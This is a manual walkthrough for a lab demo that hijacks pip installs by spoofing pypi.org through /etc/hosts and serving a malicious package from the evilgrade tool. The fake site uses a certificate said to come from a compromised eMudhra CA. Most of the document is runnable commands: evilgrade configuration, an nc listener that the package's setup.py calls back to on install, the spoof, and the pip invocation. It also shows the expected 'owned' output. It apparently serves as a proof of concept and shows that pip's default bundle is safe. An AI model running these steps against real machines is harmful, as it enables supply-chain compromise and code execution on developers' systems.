# pip MITM via eMudhra CA — manual walkthrough

End-to-end by hand, no scripts. Three terminals. The automated equivalent is
`run_pip.sh`; the two-console equivalent is `console.sh` + `victim_pip.sh`.

## What each piece does

- **evilgrade** serves the malicious PyPI index + sdist over HTTPS when a
  request arrives for a host in the module's `vh` (`pypi.org`, …).
- The TLS cert is chosen with `set sslcert`. For the MITM use
  `certs/emudhra_mitm` (CN=`pypi.org`, signed by the compromised eMudhra
  intermediate `EM DV TLS CA - G3C`).
- The domain → attacker redirect is done by evilgrade's DNS server (real) or,
  on one machine, `/etc/hosts`.
- pip is exploitable only when it trusts the **system store**; we pass
  `--cert /etc/ssl/cert.pem`. pip's default certifi bundle is NOT vulnerable.

---

## Terminal 1 — evilgrade (stays running)

```bash
cd /Users/famato/dev/evilgrade

# system perl has IO::Socket::SSL; clear PERL5LIB so it does not load Homebrew
# perl's XS .bundle files (the "loadable library ... mismatched" error).
env -u PERL5LIB -u PERL_LOCAL_LIB_ROOT PERL5LIB=.:./isrcore /usr/bin/perl ./evilgrade
```

Inside the `evilgrade>` shell:

```
set sslport 9443
set sslcert certs/emudhra_mitm
configure pypi_update
set enable 1
configure
start
```

> `sslport 9443` avoids sudo. For the victim to use the bare `https://pypi.org`
> (no port), use `set sslport 443` and start evilgrade with `sudo`.
> `configure` with no argument returns to the top-level `evilgrade>` prompt.
> `show vhosts` lists what it intercepts; `status` confirms the webserver.

Leave this terminal up — you'll see requests arrive.

---

## Terminal 2 — callback listener

```bash
nc -l 4444
```

The sdist's `setup.py` calls back here.

---

## Terminal 3 — the victim

### 1. Point pypi.org at evilgrade (the DNS spoof)

```bash
echo "127.0.0.1 pypi.org files.pythonhosted.org" | sudo tee -a /etc/hosts
```

### 2. Run a real pip install

```bash
# port 9443 (no sudo on evilgrade):
/usr/bin/python3 -m pip install --cert /etc/ssl/cert.pem \
    --no-build-isolation \
    --index-url https://pypi.org:9443/simple/ evilpkg

# or, if evilgrade is on 443:
/usr/bin/python3 -m pip install --cert /etc/ssl/cert.pem \
    --no-build-isolation \
    --index-url https://pypi.org/simple/ evilpkg
```

### 3. Revert /etc/hosts when done

```bash
sudo sed -i '' '/^127\.0\.0\.1 pypi\.org files\.pythonhosted\.org$/d' /etc/hosts
```

---

## What you should see

- **Terminal 3:** `Successfully installed evilpkg-1.0`.
- **Terminal 1 (evilgrade):** requests for `/simple/evilpkg/` and
  `/simple/evilpkg/evilpkg-1.0.tar.gz`.
- **Terminal 2 (nc):** the `owned by evilgrade -- pip install setup.py MITM`
  block with your `id`.
- **Proof file:** `cat /tmp/OWNED_BY_PIP`

### Control (shows the default is safe)

```bash
# WITHOUT --cert: pip uses its vendored certifi -> eMudhra cert rejected
/usr/bin/python3 -m pip install --no-build-isolation \
    --index-url https://pypi.org:9443/simple/ evilpkg
# -> SSL: CERTIFICATE_VERIFY_FAILED (unable to get local issuer certificate)
```

---

## Manual TLS check (optional, before firing pip)

```bash
# vulnerable transport (system store): cert accepted
curl -v --cacert /etc/ssl/cert.pem \
  --resolve pypi.org:9443:127.0.0.1 \
  https://pypi.org:9443/simple/evilpkg/ 2>&1 | grep -iE 'SSL certificate verify|issuer|subject'
```

---

## Two-console shortcut

- Terminal 1: `./demo/emudhra_mitm/console.sh 9443` (then the `set`/`start`
  commands above).
- Terminal 2: `nc -l 4444`
- Terminal 3: `./demo/emudhra_mitm/victim_pip.sh 9443`

## Cleanup / re-running

- `victim_pip.sh` can be re-run freely (it only fires pip; adds/reverts its own
  /etc/hosts line).
- If a run reports **"FAILED to bind"** or the victim gets **HTTP 000 / Empty
  reply**, a stale forked webserver holds the port:
  `./demo/emudhra_mitm/cleanup.sh` (also stops an interactive console, so run it
  only when taking everything down).
